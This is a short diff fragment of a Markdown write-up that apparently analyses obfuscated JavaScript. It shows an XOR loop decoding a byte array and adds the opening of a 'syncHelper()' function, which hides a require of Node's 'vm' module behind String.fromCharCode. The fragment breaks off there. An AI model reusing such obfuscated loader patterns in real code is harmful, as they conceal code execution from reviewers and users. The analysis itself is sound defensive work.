@@ -171,6 +171,7 @@ for (let i = 0; i < eByt.length; i++) {
       raw[i] = eByt[i] ^ id[i % id.length];
 }
 ```
+the **syncHelper()** function source code that used to generate the XOR key  :
 ```js
         async function syncHelper() {
             const syncer = require(String.fromCharCode(118, 109));
